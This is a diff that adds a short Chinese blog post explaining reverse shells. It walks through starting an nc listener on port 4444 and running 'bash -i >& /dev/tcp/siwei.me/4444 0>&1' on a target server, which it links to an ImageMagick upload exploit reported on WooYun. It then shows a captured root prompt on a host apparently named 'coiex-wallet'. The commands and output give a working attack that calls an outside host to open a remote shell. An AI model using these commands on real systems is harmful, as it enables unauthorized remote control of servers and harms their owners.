@@ -1,0 +1,18 @@
+<p>参考：http://www.codeblogbt.com/archives/127544</p>
+<p>这个英文文章对于反弹有比较详细的 bash&#160; 命令的说明</p>
+<p>另外，也参考：<a href="http://foreversong.cn/archives/1251">http://foreversong.cn/archives/1251</a>
+</p>
+<p>这里是 乌云 的一个实际例子   <a href="http://www.anquan.us/static/bugs/wooyun-2016-0205901.html">http://www.anquan.us/static/bugs/wooyun-2016-0205901.html</a>&#160; &#160;（先使用ImageMagick 上传图片，执行shell, 然后在该shell中“反向SHELL（类似一个socket client）”到自己的服务器。然后在服务器端开启 nc （类似于一个 socket server））</p>
+<p>然后到自己的服务器中， 就可以执行命令了。&#160;</p>
+<p>具体步骤:</p>
+<p>1. 在"自己的"机器上,执行命令:&#160; $ nc -lvnp 4444&#160; &#160;</p>
+<p>nc 是系统自带的命令&#160; ( man nc 就可以查看),&#160; &#160;4444 表示运行在本机的 4444 端口</p>
+<p>2. 在远程服务器上, 执行命令&#160; &#160;$&#160;bash -i &gt;&amp; /dev/tcp/siwei.me/4444 0&gt;&amp;1</p>
+<p>该命令表示, 在 "目标服务器上" ,发起对于 "自己服务器" 的链接&#160;</p>
+<p>3. 可以在 "自己的服务器"上,看到, 连接已经建立了.</p>
+<pre>nc -lvnp 4444
+Listening on [0.0.0.0] (family 0, port 4444)
+Connection from [47.74.33.90] port 4444 [tcp/*] accepted (family 2, sport 39350)
+root@coiex-wallet:~# 
+</pre>
+接下来就可以在"自己的服务器上" 实现了 SSH的形式,来操作远程服务器了. (太NB了) 
